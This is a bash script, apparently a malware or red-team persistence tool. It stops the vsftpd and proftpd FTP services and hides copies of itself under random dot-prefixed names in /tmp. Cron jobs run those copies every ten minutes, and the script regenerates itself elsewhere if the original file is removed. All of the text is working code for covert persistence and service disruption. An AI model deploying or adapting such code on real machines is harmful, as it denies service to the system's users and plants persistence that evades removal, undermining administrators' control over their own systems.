#!/bin/bash

# Disable FTP service
sudo systemctl stop vsftpd 2>/dev/null
sudo systemctl stop proftpd 2>/dev/null

# Define original location
ORIGINAL="/usr/local/bin/deathandtaxes.sh"
CHECK_DIR="/tmp"

# Generate a new random hidden filename for replication
RANDOM_DIR=$(find /tmp -type d 2>/dev/null | shuf -n 1)
RANDOM_NAME="._$(tr -dc 'a-z0-9' </dev/urandom | head -c 6).tmp"
SCRIPT_DEST="$RANDOM_DIR/$RANDOM_NAME"

# Step 1: Check if the script already has a hidden copy
EXISTING_PATH=$(find "$CHECK_DIR" -type f -name "._*" 2>/dev/null | head -n 1)

if [[ -z "$EXISTING_PATH" ]]; then
    # No copy found, create one
    cp "$0" "$SCRIPT_DEST"
    chmod +x "$SCRIPT_DEST"

    # Create a wrapper script for execution
    WRAPPER_SCRIPT="$RANDOM_DIR/.run_${RANDOM_NAME}"
    echo -e "#!/bin/bash\nbash \"$SCRIPT_DEST\"" > "$WRAPPER_SCRIPT"
    chmod +x "$WRAPPER_SCRIPT"

    # Add cron job for execution
    (crontab -l 2>/dev/null; echo "*/10 * * * * $WRAPPER_SCRIPT") | crontab -
fi

# Step 2: Check if the original script is missing and regenerate it in a new location
if [[ ! -f "$ORIGINAL" ]]; then
    NEW_RANDOM_DIR=$(find /tmp -type d 2>/dev/null | shuf -n 1)
    NEW_RANDOM_NAME="._$(tr -dc 'a-z0-9' </dev/urandom | head -c 6).tmp"
    NEW_SCRIPT_DEST="$NEW_RANDOM_DIR/$NEW_RANDOM_NAME"

    cp "$SCRIPT_DEST" "$NEW_SCRIPT_DEST"
    chmod +x "$NEW_SCRIPT_DEST"

    # Create a new wrapper script for execution
    NEW_WRAPPER_SCRIPT="$NEW_RANDOM_DIR/.run_${NEW_RANDOM_NAME}"
    echo -e "#!/bin/bash\nbash \"$NEW_SCRIPT_DEST\"" > "$NEW_WRAPPER_SCRIPT"
    chmod +x "$NEW_WRAPPER_SCRIPT"

    # Add a cron job for the new location
    (crontab -l 2>/dev/null; echo "*/10 * * * * $NEW_WRAPPER_SCRIPT") | crontab -
fi
